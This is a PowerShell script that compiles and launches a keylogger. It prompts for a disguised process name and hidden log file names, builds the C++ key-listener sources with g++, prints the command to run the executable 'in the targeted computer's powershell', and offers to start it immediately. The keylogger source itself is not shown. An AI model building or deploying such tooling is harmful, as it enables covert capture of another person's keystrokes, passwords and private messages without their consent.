$default_proccess_name = "klaf"
$default_logger_dir_name = "C:\temp"
$default_key_logger_file_name = ".keyslog"
$default_debug_logger_file_name = ".debuglog"

$Proccess_name = Read-Host -Prompt "Input desired proccess name [default: '$default_proccess_name']> "
if ([string]::IsNullOrWhiteSpace($Proccess_name)) {
    $Proccess_name = $default_proccess_name
}

$logger_dir_name = Read-Host -Prompt "Input desired directory to save the logger [default: '$default_logger_dir_name' ]> "
if ([string]::IsNullOrWhiteSpace($logger_dir_name)) {
    $logger_dir_name = $default_logger_dir_name
}

$key_logger_file_name = Read-Host -Prompt "Input desired key logger files name [default: '$default_key_logger_file_name' ]> "
if ([string]::IsNullOrWhiteSpace($key_logger_file_name)) {
    $key_logger_file_name = $default_key_logger_file_name
}

$debug_logger_file_name = Read-Host -Prompt "Input desired key logger files name [default: '$default_debug_logger_file_name' ]> "
if ([string]::IsNullOrWhiteSpace($debug_logger_file_name)) {
    $debug_logger_file_name = $default_debug_logger_file_name
}

Write-Host ""
Write-Host "Compiling..."
g++ --% ./main.cpp ./key_listener.cpp ./logger.cpp -std=c++14 -DKEYLOGGER_FILE_NAME=\"$key_logger_file_name\" -DKEYLOGGER_DEBUG_FILE_NAME=\"$debug_logger_file_name\" -o $Proccess_name

if ($?) {
   Write-Host "Done!`n"
} else {
   Write-Host "Fail to compile...`n"
   exit 1
}

Write-Host "Compiled and saved exe as " $Proccess_name " in the current directory"
Write-Host "To begin run the next command in the targeted computer's powershell cmd`n"
Write-Host "Command line: Start-Process -FilePath " $Proccess_name $Logger_dir_name " -Wait -NoNewWindow`n"

$run_decision = Read-Host -Prompt "Run now? [Y/n] "
if ([string]::IsNullOrWhiteSpace($run_decision) -OR $run_decision -in 'y', 'Y') {
    Start-Process -FilePath .\$Proccess_name $Logger_dir_name -Wait -NoNewWindow
}

if ($run_decision -eq 'n') {
    Write-Host "`nBye Bye for now"
}
